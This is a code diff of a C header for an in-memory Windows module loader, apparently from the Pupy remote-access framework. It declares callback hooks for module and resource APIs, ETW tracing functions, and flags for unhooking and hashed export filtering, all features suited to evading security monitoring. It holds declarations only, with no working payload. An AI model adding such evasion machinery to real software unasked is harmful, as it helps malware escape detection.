@@ -39,9 +39,69 @@ typedef void *HCUSTOMMODULE;
 extern "C" {
 #endif
 
-typedef HCUSTOMMODULE (*CustomLoadLibraryFunc)(LPCSTR, void *);
-typedef FARPROC (*CustomGetProcAddressFunc)(HCUSTOMMODULE, LPCSTR, void *);
-typedef void (*CustomFreeLibraryFunc)(HCUSTOMMODULE, void *);
+typedef HMODULE (CALLBACK *CustomGetModuleHandleA)(LPCSTR);
+typedef HMODULE (CALLBACK *CustomGetModuleHandleW)(LPCWSTR);
+typedef BOOL (CALLBACK *CustomGetModuleHandleExA)(DWORD dwFlags, LPVOID lpArg, HMODULE *phModule);
+typedef BOOL (CALLBACK *CustomGetModuleHandleExW)(DWORD dwFlags, LPVOID lpArg, HMODULE *phModule);
+typedef HMODULE (CALLBACK *CustomLoadLibraryExA)(LPCSTR, HANDLE, DWORD);
+typedef HMODULE (CALLBACK *CustomLoadLibraryExW)(LPCWSTR, HANDLE, DWORD);
+typedef HCUSTOMMODULE (CALLBACK *CustomLoadLibraryA)(LPCSTR);
+typedef HCUSTOMMODULE (CALLBACK *CustomLoadLibraryW)(LPCWSTR);
+
+
+typedef DWORD (CALLBACK *CustomGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
+typedef DWORD (CALLBACK *CustomGetModuleFileNameW)(HMODULE, LPWSTR, DWORD);
+
+typedef HRSRC (CALLBACK *CustomFindResourceA)(HMEMORYMODULE module, LPCSTR name, LPCSTR type);
+typedef HRSRC (CALLBACK *CustomFindResourceW)(HMEMORYMODULE module, LPCWSTR name, LPCWSTR type);
+
+typedef HRSRC (CALLBACK *CustomFindResourceExA)(HMEMORYMODULE hModule, LPCSTR name, LPCSTR type, WORD language);
+typedef HRSRC (CALLBACK *CustomFindResourceExW)(HMEMORYMODULE hModule, LPCWSTR name, LPCWSTR type, WORD language);
+
+typedef DWORD (CALLBACK *CustomSizeofResource)(HMEMORYMODULE module, HRSRC resource);
+typedef LPVOID (CALLBACK *CustomLoadResource)(HMEMORYMODULE module, HRSRC resource);
+
+typedef FARPROC (CALLBACK *CustomGetProcAddress)(HMODULE, LPCSTR);
+typedef void (CALLBACK *CustomFreeLibraryFunc)(HMODULE);
+
+typedef HANDLE (CALLBACK *CustomCreateThread)(
+    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
+    SIZE_T                  dwStackSize,
+    LPTHREAD_START_ROUTINE  lpStartAddress,
+    LPVOID                  lpParameter,
+    DWORD                   dwCreationFlags,
+    LPDWORD                 lpThreadId
+);
+
+#ifdef _PUPY_PRIVATE_WS2_32
+typedef NTSTATUS (CALLBACK *CustomEtwRegister) (
+    LPCGUID            ProviderId,
+    PVOID EnableCallback,
+    PVOID              CallbackContext,
+    PULONGLONG         RegHandle
+);
+
+typedef ULONG (CALLBACK *CustomEtwEventWrite) (
+    ULONGLONG RegHandle,
+    PVOID EventDescriptor,
+    ULONG UserDataCount,
+    PVOID UserData
+);
+
+typedef ULONG (CALLBACK *CustomEtwEventWriteFull) (
+    ULONGLONG RegHandle,
+    PVOID EventDescriptor,
+    USHORT EventProperty,
+    LPCGUID ActivityId,
+    LPCGUID RelatedActivityId,
+    ULONG UserDataCount,
+    PVOID UserData
+);
+
+typedef NTSTATUS (CALLBACK *CustomEtwUnregister) (
+    ULONGLONG RegHandle
+);
+#endif
 
 /**
  * Load EXE/DLL from memory location.
@@ -51,16 +111,68 @@ typedef void (*CustomFreeLibraryFunc)(HCUSTOMMODULE, void *);
  */
 HMEMORYMODULE MemoryLoadLibrary(const void *);
 
+typedef struct {
+    CustomLoadLibraryA loadLibraryA;
+    CustomLoadLibraryW loadLibraryW;
+    CustomLoadLibraryExA loadLibraryExA;
+    CustomLoadLibraryExW loadLibraryExW;
+    CustomGetModuleHandleA getModuleHandleA;
+    CustomGetModuleHandleW getModuleHandleW;
+    CustomGetModuleHandleExA getModuleHandleExA;
+    CustomGetModuleHandleExW getModuleHandleExW;
+    CustomGetModuleFileNameA getModuleFileNameA;
+    CustomGetModuleFileNameW getModuleFileNameW;
+    CustomGetProcAddress getProcAddress;
+    CustomFreeLibraryFunc freeLibrary;
+
+    CustomFindResourceA getFindResourceA;
+    CustomFindResourceW getFindResourceW;
+    CustomFindResourceExA getFindResourceExA;
+    CustomFindResourceExW getFindResourceExW;
+    CustomSizeofResource getSizeofResource;
+    CustomLoadResource getLoadResource;
+
+    CustomGetProcAddress systemGetProcAddress;
+    CustomGetModuleFileNameA systemGetModuleFileNameA;
+    CustomGetModuleFileNameW systemGetModuleFileNameW;
+    CustomFindResourceExW systemFindResourceExW;
+    CustomSizeofResource systemSizeofResource;
+    CustomLoadResource systemLoadResource;
+
+    CustomCreateThread createThread;
+
+#ifdef _PUPY_PRIVATE_WS2_32
+    CustomEtwRegister systemEtwRegister;
+    CustomEtwEventWrite systemEtwEventWrite;
+    CustomEtwEventWriteFull systemEtwEventWriteFull;
+    CustomEtwUnregister systemEtwUnregister;
+#endif
+} DL_CALLBACKS, *PDL_CALLBACKS;
+
+typedef enum {
+    MEMORY_LOAD_DEFAULT = 0,
+    MEMORY_LOAD_NO_EP = 1 << 0,
+    MEMORY_LOAD_NO_TLS_CALLBACKS = 1 << 1,
+    MEMORY_LOAD_NO_EXCEPTION_HANDLING = 1 << 2,
+    MEMORY_LOAD_FROM_HMODULE = 1 << 3,
+    MEMORY_LOAD_ALIASED = 1 << 4,
+    MEMORY_LOAD_UNHOOK = 1 << 5,
+    MEMORY_LOAD_EXPORT_FILTER_FNV1A = 1 << 6,
+    MEMORY_LOAD_EXPORT_FILTER_PREFIX = 1 << 7,
+} MEMORY_LOAD_FLAGS;
+
 /**
  * Load EXE/DLL from memory location using custom dependency resolvers.
  *
  * Dependencies will be resolved using passed callback methods.
  */
-HMEMORYMODULE MemoryLoadLibraryEx(const void *,
-    CustomLoadLibraryFunc,
-    CustomGetProcAddressFunc,
-    CustomFreeLibraryFunc,
-    void *);
+HMEMORYMODULE MemoryLoadLibraryEx(
+    const void *pvData,
+    PDL_CALLBACKS pdlCallbacks,
+    void *pvDllMainReserved,
+    void *pvExportFilter,
+    MEMORY_LOAD_FLAGS flags
+);
 
 /**
  * Get address of exported method. Supports loading both by name and by
@@ -73,48 +185,19 @@ FARPROC MemoryGetProcAddress(HMEMORYMODULE, LPCSTR);
  */
 void MemoryFreeLibrary(HMEMORYMODULE);
 
-/**
- * Execute entry point (EXE only). The entry point can only be executed
- * if the EXE has been loaded to the correct base address or it could
- * be relocated (i.e. relocation information have not been stripped by
- * the linker).
- *
- * Important: calling this function will not return, i.e. once the loaded
- * EXE finished running, the process will terminate.
- *
- * Returns a negative value if the entry point could not be executed.
- */
-int MemoryCallEntryPoint(HMEMORYMODULE);
+DWORD MemoryModuleFileNameA(HMODULE, LPSTR, DWORD);
+DWORD MemoryModuleFileNameW(HMODULE, LPWSTR, DWORD);
 
-/**
- * Find the location of a resource with the specified type and name.
- */
-HMEMORYRSRC MemoryFindResource(HMEMORYMODULE, LPCTSTR, LPCTSTR);
+BOOL GetMemoryModuleInfo(HMEMORYMODULE hModule, PVOID *ppvBaseAddress, PULONG pulSize);
 
-/**
- * Find the location of a resource with the specified type, name and language.
- */
-HMEMORYRSRC MemoryFindResourceEx(HMEMORYMODULE, LPCTSTR, LPCTSTR, WORD);
+HMEMORYRSRC MemoryFindResourceA(HMEMORYMODULE module, LPCSTR name, LPCSTR type);
+HMEMORYRSRC MemoryFindResourceW(HMEMORYMODULE module, LPCWSTR name, LPCWSTR type);
 
-/**
- * Get the size of the resource in bytes.
- */
-DWORD MemorySizeofResource(HMEMORYMODULE, HMEMORYRSRC);
+HMEMORYRSRC MemoryFindResourceExA(HMEMORYMODULE hModule, LPCSTR name, LPCSTR type, WORD language);
+HMEMORYRSRC MemoryFindResourceExW(HMEMORYMODULE hModule, LPCWSTR name, LPCWSTR type, WORD language);
 
-/**
- * Get a pointer to the contents of the resource.
- */
-LPVOID MemoryLoadResource(HMEMORYMODULE, HMEMORYRSRC);
-
-/**
- * Load a string resource.
- */
-int MemoryLoadString(HMEMORYMODULE, UINT, LPTSTR, int);
-
-/**
- * Load a string resource with a given language.
- */
-int MemoryLoadStringEx(HMEMORYMODULE, UINT, LPTSTR, int, WORD);
+DWORD MemorySizeofResource(HMEMORYMODULE module, HMEMORYRSRC resource);
+LPVOID MemoryLoadResource(HMEMORYMODULE module, HMEMORYRSRC resource);
 
 #ifdef __cplusplus
 }
